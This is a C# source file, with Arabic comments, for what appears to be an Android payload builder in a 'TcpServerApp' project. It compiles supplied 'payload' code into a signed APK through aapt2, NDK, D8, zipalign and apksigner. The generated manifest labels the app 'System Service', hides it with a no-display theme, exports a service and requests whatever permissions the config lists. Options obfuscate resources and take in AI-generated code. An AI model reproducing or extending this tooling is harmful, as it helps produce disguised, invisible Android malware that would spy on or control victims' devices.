using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TcpServerApp.Services.Elite
{
    // ── نتيجة كل خطوة في البناء ─────────────────────────────────────────────
    public record BuildStepResult(bool Success, string Output, string Error, int ExitCode);

    public class AdvancedBuildPipeline
    {
        private readonly string _buildRoot;
        private readonly string _toolchainRoot;
        private readonly StatusReporter _reporter;
        private const int ProcessTimeoutMs = 60_000; // 60 ثانية كحد أقصى لكل أداة

        public delegate void StatusReporter(string message);

        public AdvancedBuildPipeline(string buildRoot, StatusReporter reporter = null)
        {
            _buildRoot = buildRoot;
            _reporter = reporter ?? (_ => { });
            _toolchainRoot = ToolLocator.Android36Root;
        }

        public async Task<string> ExecutePipelineAsync(EliteGenerationResult payloadData, bool obfuscateResources = false, CodeGenerationService aiEngine = null, CancellationToken ct = default)
        {
            return await ExecutePipelineInternalAsync(payloadData, null, obfuscateResources, aiEngine, ct);
        }

        public async Task<string> ExecutePipelineFromProjectAsync(string projectDir, EliteGenerationResult configData, bool obfuscateResources = false, CodeGenerationService aiEngine = null, CancellationToken ct = default)
        {
            return await ExecutePipelineInternalAsync(configData, projectDir, obfuscateResources, aiEngine, ct);
        }

        private async Task<string> ExecutePipelineInternalAsync(EliteGenerationResult payloadData, string inputProjectDir, bool obfuscateResources, CodeGenerationService aiEngine = null, CancellationToken ct = default)
        {
            ct.ThrowIfCancellationRequested();
            _reporter("🚀 Starting Elite Build Pipeline (Android 36 Mode)...");
            
            // 0. Prepare Environment
            string stagingDir = Path.Combine(_buildRoot, "staging");
            string resDir = Path.Combine(stagingDir, "res");
            string srcDir = Path.Combine(stagingDir, "src");
            string objDir = Path.Combine(stagingDir, "obj");
            string binDir = Path.Combine(stagingDir, "bin");
            
            // تنظيف المجلد القديم بأمان
            if (Directory.Exists(stagingDir))
                try { Directory.Delete(stagingDir, true); } catch { /* قد يكون مقفلاً — نتجاوز */ }

            foreach (var dir in new[] { resDir, srcDir, objDir, binDir })
                Directory.CreateDirectory(dir);

            // Import Project if exists
            if (!string.IsNullOrEmpty(inputProjectDir) && Directory.Exists(inputProjectDir))
            {
                // Copy all to src/res respectively
                // Assumes standard structure: src/..., res/...
                // Or if it's a flat structure, we logic it out.
                // The Template "ResearchCore" has top-level files + subdirs.
                // We'll copy EVERYTHING to srcDir initially, then move res if found?
                // Actually ResearchWrapper usually has 'src' and 'res'.
                // Let's copy the whole dir to staging root and merge.
                CopyDirectory(inputProjectDir, stagingDir);
            }

            // 1. Generate Manifest
            _reporter("📝 Generating Advanced Manifest...");
            string manifestPath = Path.Combine(stagingDir, "AndroidManifest.xml");
            await GenerateManifestAsync(payloadData, manifestPath);

            // 2. Resource Compilation (AAPT2)
            _reporter("🎨 Compiling Resources (AAPT2)...");
            string rJavaDir = Path.Combine(srcDir, "gen"); // For R.java
            Directory.CreateDirectory(rJavaDir);
            
            // 2a. Compile (Flat)
            // Even if we have no resources, we need to run link to generate R.java and Processed Manifest
            // But AAPT2 compile requires input. If no resources, we might skip compile but MUST run link.
            // For now, let's assume we might have an icon.
            string compiledResZip = Path.Combine(objDir, "resources.zip");
            
            // We need to construct a minimal resource structure if none exists
            if (!Directory.EnumerateFileSystemEntries(resDir).Any())
            {
                 // Create dummy value to satisfy AAPT2
                 Directory.CreateDirectory(Path.Combine(resDir, "values"));
                 await File.WriteAllTextAsync(Path.Combine(resDir, "values", "strings.xml"), "<resources><string name=\"app_name\">System Service</string></resources>");
            }

            // AAPT2 Compile — دفعة واحدة بدلاً من استدعاء لكل ملف (أسرع بكثير)
            var flatDir = Path.Combine(objDir, "flat");
            Directory.CreateDirectory(flatDir);

            var resStep = await RunProcessAsync(
                ToolLocator.ResearchAapt2,
                $"compile --dir \"{resDir}\" -o \"{flatDir}\"",
                ct: ct);

            if (!resStep.Success)
                _reporter($"⚠️ AAPT2 compile warning: {resStep.Error}"); // تحذير فقط — قد تكون بعض الموارد اختيارية

            // 2b. Link — توليد R.java والحزمة
            var linkArgsSb = new StringBuilder();
            linkArgsSb.Append($"link -o \"{compiledResZip}\" -I \"{ToolLocator.ResearchAndroidJar}\"")
                      .Append($" --manifest \"{manifestPath}\"")
                      .Append($" --java \"{rJavaDir}\"")
                      .Append(" --auto-add-overlay");

            foreach (var flat in Directory.GetFiles(flatDir, "*.flat"))
                linkArgsSb.Append($" \"{flat}\"");

            if (obfuscateResources)
                linkArgsSb.Append(" --collapse-resource-names --enable-sparse-encoding");

            var linkStep = await RunProcessAsync(ToolLocator.ResearchAapt2, linkArgsSb.ToString(), ct: ct);
            if (!linkStep.Success)
                throw new Exception($"AAPT2 link failed (exit {linkStep.ExitCode}):\n{linkStep.Error}");

            // 2.5 Native Bridge (NDK)
            string nativeLibPath = null;
            if (payloadData.EnableNativeBridge)
            {
                if (!string.IsNullOrEmpty(ToolLocator.NdkClang) && File.Exists(ToolLocator.NdkClang))
                {
                    _reporter("🧬 Compiling Native Bridge (C++)...");
                    var bridgeSvc = new NativeBridgeService();
                    string cppSource = bridgeSvc.GenerateCppSource(payloadData.PackageName, "ELITE_SECURE_KEY"); // Pass real key if avail
                    
                    string jniDir = Path.Combine(stagingDir, "jni");
                    Directory.CreateDirectory(jniDir);
                    string cppFile = Path.Combine(jniDir, "native-lib.cpp");
                    await File.WriteAllTextAsync(cppFile, cppSource);

                    // Compile for ARM64
                    string libDir = Path.Combine(stagingDir, "lib", "arm64-v8a");
                    Directory.CreateDirectory(libDir);
                    string soFile = Path.Combine(libDir, "libnative-lib.so");

                    // Clang Args
                    // --target=aarch64-linux-android35
                    // API 36 (Android 16 Baklava) — تصحيح من android35
                    string clangArgs = $"--target=aarch64-linux-android36 -shared -fPIC -o \"{soFile}\" \"{cppFile}\"";
                    var nativeStep = await RunProcessAsync(ToolLocator.NdkClang, clangArgs, ct: ct);
                    if (!nativeStep.Success)
                        _reporter($"⚠️ NDK compile warning: {nativeStep.Error}");
                    
                    _reporter("✅ Native Library Generated.");
                }
                else
                {
                    _reporter("⚠️ NDK Clang not found. Skipping Native Bridge compilation.");
                }
            }

            // 3. Kotlin/Java Compilation
            _reporter("☕ Compiling Source Code (Kotlinc)...");
            
            // Write Payload Source if provided
            if (!string.IsNullOrEmpty(payloadData.SourceCode))
            {
                string mainKt = Path.Combine(srcDir, "Payload.kt");
                await File.WriteAllTextAsync(mainKt, payloadData.SourceCode);
            }

            // Compile
            string classesJar = Path.Combine(objDir, "classes.jar");
            
            // Classpath must include android.jar AND the previously generated R.java (which we need to compile first?)
            // Actually, R.java is generated by AAPT2. We need to compile R.java + Payload.kt together?
            // Or compile R.java -> R.class then Payload.kt.
            // Kotlinc can handle both.
            
            // Find all source files (Payload + R.java + any plugins)
            var sources = Directory.GetFiles(srcDir, "*.kt", SearchOption.AllDirectories).ToList();
            sources.AddRange(Directory.GetFiles(srcDir, "*.java", SearchOption.AllDirectories));
            
            string sourceList = string.Join(" ", sources.Select(s => $"\"{s}\""));
            // Kotlin Home fix
            string kotlincBin = Path.Combine(ToolLocator.ResearchToolsRoot, "kotlinc", "bin", "kotlinc.bat");
            if (!File.Exists(kotlincBin)) kotlincBin = "kotlinc"; // Path fallback

            string cp = $"\"{ToolLocator.Android36JarPath}\""; // Minimal CP
            
            var kotlinStep = await RunProcessAsync(kotlincBin, $"{sourceList} -cp {cp} -include-runtime -d \"{classesJar}\"", ct: ct);
            if (!kotlinStep.Success)
                throw new Exception($"Kotlin compilation failed (exit {kotlinStep.ExitCode}):\n{kotlinStep.Error}");
            _reporter($"    stdout: {kotlinStep.Output.Trim().Split('\n')[0]}"); // أول سطر فقط لتجنب الإطالة

            // 4. Dexing (D8 Release Mode)
            _reporter("🔨 Dexing (D8 Pro)...");
            string dexOutDir = Path.Combine(objDir, "dex");
            Directory.CreateDirectory(dexOutDir);

            string d8Args = $"--release --min-api 36 --output \"{dexOutDir}\" --lib \"{ToolLocator.Android36JarPath}\" \"{classesJar}\"";
            var d8Step = await RunProcessAsync(ToolLocator.ResearchD8, d8Args, ct: ct);
            if (!d8Step.Success)
                throw new Exception($"D8 dexing failed (exit {d8Step.ExitCode}):\n{d8Step.Error}");

            // 5. APK Assembly
            _reporter("📦 Assembling Final Artifact...");
            string unalignedApk = Path.Combine(objDir, "unaligned.apk");
            
            // We use the resources.zip from AAPT2 as the base, then add classes.dex
            File.Copy(compiledResZip, unalignedApk, true);
            
            // إضافة classes.dex داخل APK
            await AddFileToZipAsync(unalignedApk, Path.Combine(dexOutDir, "classes.dex"), "classes.dex");

            // 6. Zipalign
            ct.ThrowIfCancellationRequested();
            _reporter("📏 Aligning (4-byte boundary)...");
            string alignedApk = Path.Combine(binDir, "payload_aligned.apk");
            var alignStep = await RunProcessAsync(ToolLocator.ResearchZipalign, $"-p -f -v 4 \"{unalignedApk}\" \"{alignedApk}\"", ct: ct);
            if (!alignStep.Success)
                _reporter($"⚠️ zipalign warning (exit {alignStep.ExitCode}) — continuing");

            // 7. Signing
            _reporter("🔐 Signing (Baklava Certificate)...");
            string timestamp  = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            string finalApk   = Path.Combine(_buildRoot, $"Research_{timestamp}.apk");

            string keystore = File.Exists(Path.Combine(ToolLocator.Android36Root, "debug.keystore"))
                ? Path.Combine(ToolLocator.Android36Root, "debug.keystore")
                : Path.Combine(ToolLocator.ResearchToolsRoot, "debug.keystore");

            if (!File.Exists(keystore))
                throw new FileNotFoundException("debug.keystore غير موجود — يرجى وضعه في مجلد الأدوات.", keystore);

            var signStep = await RunProcessAsync(
                ToolLocator.ResearchApkSigner,
                $"sign --ks \"{keystore}\" --ks-pass pass:android --key-pass pass:android --out \"{finalApk}\" \"{alignedApk}\"",
                ct: ct);
            if (!signStep.Success)
                throw new Exception($"APK signing failed (exit {signStep.ExitCode}):\n{signStep.Error}");

            _reporter("✅ Build Complete: " + Path.GetFileName(finalApk));
            return finalApk;
        }

        private async Task GenerateManifestAsync(EliteGenerationResult config, string path)
        {
            var sb = new StringBuilder();
            sb.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            sb.AppendLine($"<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"{config.PackageName}\">");
            
            // Permissions
            foreach(var perm in config.RequiredPermissions.Distinct())
            {
                sb.AppendLine($"    <uses-permission android:name=\"{perm}\" />");
            }

            sb.AppendLine("    <application android:label=\"System Service\" android:icon=\"@mipmap/ic_launcher\" android:theme=\"@android:style/Theme.NoDisplay\">");
            
            // Service
            sb.AppendLine($"        <service android:name=\".{config.ServiceName}\" android:exported=\"true\" android:enabled=\"true\" />");
            
            // Activities
            foreach(var act in config.ExtraManifestActivities)
            {
                sb.AppendLine("        " + act);
            }

            // Receivers
            foreach(var recv in config.ExtraManifestReceivers.Values)
            {
                sb.AppendLine(recv);
            }

            sb.AppendLine("    </application>");
            sb.AppendLine("</manifest>");

            await File.WriteAllTextAsync(path, sb.ToString());
        }

        /// <summary>
        /// تشغيل أداة خارجية مع timeout ودعم الإلغاء.
        /// تُعيد BuildStepResult بدلاً من رمي استثناء — القرار للمستدعي.
        /// </summary>
        private async Task<BuildStepResult> RunProcessAsync(
            string tool, string args,
            Dictionary<string, string> envVars = null,
            CancellationToken ct = default)
        {
            var psi = new ProcessStartInfo
            {
                FileName           = tool,
                Arguments          = args,
                UseShellExecute    = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow     = true
            };

            // حقن JAVA_HOME تلقائياً (ضروري لـ kotlinc و d8)
            if (ToolLocator.HasJava(out string javaExe))
                psi.EnvironmentVariables["JAVA_HOME"] = Path.GetDirectoryName(Path.GetDirectoryName(javaExe));

            if (envVars != null)
                foreach (var kv in envVars)
                    psi.EnvironmentVariables[kv.Key] = kv.Value;

            using var proc = Process.Start(psi)
                ?? throw new InvalidOperationException($"Failed to start: {Path.GetFileName(tool)}");

            var outputTask = proc.StandardOutput.ReadToEndAsync();
            var errorTask  = proc.StandardError.ReadToEndAsync();

            // انتظار مع timeout + CancellationToken
            using var timeoutCts  = new CancellationTokenSource(ProcessTimeoutMs);
            using var linkedCts   = CancellationTokenSource.CreateLinkedTokenSource(ct, timeoutCts.Token);

            try
            {
                await proc.WaitForExitAsync(linkedCts.Token);
            }
            catch (OperationCanceledException)
            {
                try { proc.Kill(true); } catch { }
                if (ct.IsCancellationRequested)
                    throw; // إلغاء من المستخدم — يُعاد رمي الاستثناء
                throw new TimeoutException($"Process timed out after {ProcessTimeoutMs / 1000}s: {Path.GetFileName(tool)}");
            }

            await Task.WhenAll(outputTask, errorTask);

            string output = outputTask.Result;
            string error  = errorTask.Result;

            if (!string.IsNullOrWhiteSpace(error) && proc.ExitCode != 0)
                _reporter($"    ⚠️ [{Path.GetFileName(tool)}] stderr: {error.Split('\n')[0].Trim()}");

            return new BuildStepResult(proc.ExitCode == 0, output, error, proc.ExitCode);
        }

        private async Task AddFileToZipAsync(string zipPath, string filePath, string entryName)
        {
            using var archive = System.IO.Compression.ZipFile.Open(zipPath, System.IO.Compression.ZipArchiveMode.Update);
            archive.CreateEntryFromFile(filePath, entryName);
        }

        private void CopyDirectory(string sourceDir, string destinationDir)
        {
            Directory.CreateDirectory(destinationDir);
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                File.Copy(file, Path.Combine(destinationDir, Path.GetFileName(file)), true);
            }
            foreach (var directory in Directory.GetDirectories(sourceDir))
            {
                CopyDirectory(directory, Path.Combine(destinationDir, Path.GetFileName(directory)));
            }
        }
    }
}
